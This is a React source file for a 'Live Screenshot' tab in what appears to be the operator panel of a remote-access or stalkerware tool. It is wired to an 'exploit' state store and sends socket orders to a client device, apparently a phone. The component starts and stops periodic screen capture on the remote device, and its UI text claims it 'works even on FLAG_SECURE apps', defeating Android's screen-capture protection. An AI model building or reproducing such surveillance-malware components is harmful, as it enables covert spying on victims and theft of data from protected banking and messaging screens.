import { useEffect, useState } from 'react'
import { Button } from '@/components/ui/button'
import { Camera, Play, Square, RefreshCw } from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'

export function LiveScreenshotTab({ clientId }: { clientId: string }) {
  const screenshot = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.liveScreenshot ?? null,
  )
  const timestamp = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.liveScreenshotTime ?? 0,
  )

  const [active, setActive] = useState(false)
  const [interval, setIntervalMs] = useState(2000)

  useEffect(() => {
    return () => {
      if (active) {
        emitOrder(clientId, 'live_screenshot', { action: 'stop' })
      }
    }
  }, [])

  const start = () => {
    setActive(true)
    emitOrder(clientId, 'live_screenshot', {
      action: 'start',
      interval,
    })
  }
  const stop = () => {
    setActive(false)
    emitOrder(clientId, 'live_screenshot', { action: 'stop' })
  }

  const captureOnce = () => {
    emitOrder(clientId, 'live_screenshot', {
      action: 'start',
      interval: 500,
    })
    setTimeout(() => {
      emitOrder(clientId, 'live_screenshot', { action: 'stop' })
    }, 2000)
  }

  return (
    <div className="space-y-3">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Camera className="h-4 w-4 text-blue-400" />
          <h3 className="text-sm font-semibold text-zinc-100">
            Live Screenshot
          </h3>
        </div>
        <span
          className={`text-xs ${
            active ? 'text-blue-400' : 'text-zinc-500'
          }`}
        >
          {active ? 'Live' : 'Idle'}
        </span>
      </div>

      <p className="text-xs text-zinc-500">
        Captures the screen every few seconds. Works even on FLAG_SECURE apps.
      </p>

      {/* Interval selector */}
      <div className="flex items-center gap-2 text-xs">
        <span className="text-zinc-500">Interval:</span>
        {[1000, 2000, 3000, 5000].map((ms) => (
          <button
            key={ms}
            onClick={() => setIntervalMs(ms)}
            className={`px-2 py-1 rounded ${
              interval === ms
                ? 'bg-blue-500/30 text-blue-200 ring-1 ring-blue-500/50'
                : 'bg-zinc-900 text-zinc-400 ring-1 ring-white/10'
            }`}
          >
            {ms / 1000}s
          </button>
        ))}
      </div>

      {/* Image viewer */}
      <div
        className="relative mx-auto w-full overflow-hidden rounded-xl border border-white/10 bg-zinc-950"
        style={{
          height: 'min(55vh, 600px)',
          aspectRatio: '9 / 19.5',
          maxWidth: '100%',
        }}
      >
        {screenshot ? (
          <img
            src={`data:image/jpeg;base64,${screenshot}`}
            alt="Live screenshot"
            className="w-full h-full object-contain"
          />
        ) : (
          <div className="absolute inset-0 grid place-items-center text-zinc-600 text-xs">
            {active ? 'Waiting for first frame...' : 'Start to see screen'}
          </div>
        )}

        {timestamp > 0 && (
          <div className="absolute bottom-2 right-2 rounded bg-black/70 px-2 py-1 text-[10px] text-zinc-300">
            {new Date(timestamp).toLocaleTimeString()}
          </div>
        )}
      </div>

      {/* Controls */}
      <div className="flex gap-2">
        {!active ? (
          <>
            <Button
              onClick={start}
              className="bg-blue-500 hover:bg-blue-400 text-white font-semibold"
            >
              <Play className="h-4 w-4" /> Start Live
            </Button>
            <Button
              onClick={captureOnce}
              variant="outline"
              className="border-white/10 text-zinc-300"
            >
              <RefreshCw className="h-4 w-4" /> Once
            </Button>
          </>
        ) : (
          <Button
            onClick={stop}
            className="bg-rose-500/90 hover:bg-rose-500 text-white font-semibold"
          >
            <Square className="h-4 w-4" /> Stop
          </Button>
        )}
      </div>
    </div>
  )
}
